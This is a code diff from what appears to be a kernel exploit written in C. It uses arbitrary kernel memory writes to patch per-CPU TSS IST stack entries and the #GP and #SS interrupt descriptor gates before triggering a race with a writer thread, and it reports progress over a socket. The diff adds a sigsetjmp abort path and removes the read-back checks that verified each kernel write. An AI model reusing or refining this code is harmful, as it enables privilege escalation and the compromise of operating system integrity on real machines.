@@ -5005,7 +5005,22 @@ broad_done:
          * IMPORTANT: The IDT is shared across ALL CPUs.  We set IST7
          * to ist_stack_top on all VALIDATED CPUs.  Unvalidated CPUs
          * keep IST7=0 — we accept the brief risk since the patch
-         * window is only ~10µs per attempt. */
+         * window is only ~10µs per attempt.
+         *
+         * We set up sigsetjmp BEFORE the writes so that if a stray
+         * signal arrives during kernel_setlong/kernel_setchar, the
+         * handler longjmps back here instead of calling _exit.
+         * The cleanup path will restore any partially-written TSS/IDT. */
+        gp_trap_jmp_valid = 1;
+        if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
+            /* Signal received during TSS/IDT patching */
+            send_response(sock,
+                "  Signal during patching (sig=%d) — aborting safely\n",
+                (int)gp_trap_sig_received);
+            gp_trap_jmp_valid = 0;
+            goto step7_cleanup;
+        }
+
         /* Step 1: Set TSS IST entries on validated CPUs FIRST — before
          * touching the IDT. */
         send_response(sock, "\n  Applying TSS patches (%d validated CPUs)...\n",
@@ -5015,48 +5030,25 @@ broad_done:
             for (int cpu = 0; cpu < num_cpus_found; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
                 uint64_t ist_off = cpu_tss + 0x24 + idx * 8;
-                /* Verify write target by reading first */
-                uint64_t old_val = kernel_getlong(ist_off);
-                send_response(sock, "  CPU%d IST%d: writing 0x%lx -> 0x%lx "
-                              "(at 0x%lx, was 0x%lx)\n",
-                              cpu, gp_ist_index, old_val, ist_stack_top,
-                              ist_off, old_val);
                 kernel_setlong(ist_off, ist_stack_top);
-                /* Verify write succeeded */
-                uint64_t verify = kernel_getlong(ist_off);
-                if (verify != ist_stack_top) {
-                    send_response(sock, "  CPU%d IST%d: WRITE FAILED "
-                                  "(read back 0x%lx, expected 0x%lx)\n",
-                                  cpu, gp_ist_index, verify, ist_stack_top);
-                    /* Abort — don't patch IDT with bad IST values */
-                    goto step7_cleanup;
-                }
                 ist_modified_percpu[cpu][idx] = 1;
-                send_response(sock, "  CPU%d IST%d -> 0x%lx (verified)\n",
-                              cpu, gp_ist_index, ist_stack_top);
+                send_response(sock, "  CPU%d IST%d -> 0x%lx (at 0x%lx)\n",
+                              cpu, gp_ist_index, ist_stack_top, ist_off);
             }
         }
         /* Step 2: NOW patch the IDT gates — all CPUs have valid IST7 */
         send_response(sock, "  Patching IDT gates...\n");
         if (gp_needs_patch) {
             uint8_t new_byte = (idt_gate_saved[4] & 0xF8) | 7;
-            send_response(sock, "  #GP gate: writing byte at 0x%lx "
-                          "(0x%02x -> 0x%02x)\n",
-                          idt_access + 13 * 16 + 4,
-                          idt_gate_saved[4], new_byte);
             kernel_setchar(idt_access + 13 * 16 + 4, new_byte);
             idt_gate_modified = 1;
-            send_response(sock, "  #GP gate IST -> 7 (done)\n");
+            send_response(sock, "  #GP gate IST -> 7\n");
         }
         if (ss_needs_patch) {
             uint8_t new_byte = (ss_gate_saved[4] & 0xF8) | 7;
-            send_response(sock, "  #SS gate: writing byte at 0x%lx "
-                          "(0x%02x -> 0x%02x)\n",
-                          idt_access + 12 * 16 + 4,
-                          ss_gate_saved[4], new_byte);
             kernel_setchar(idt_access + 12 * 16 + 4, new_byte);
             ss_gate_modified = 1;
-            send_response(sock, "  #SS gate IST -> 7 (done)\n");
+            send_response(sock, "  #SS gate IST -> 7\n");
         }
 
         /* Step 3: Start writer thread NOW — right before trigger */
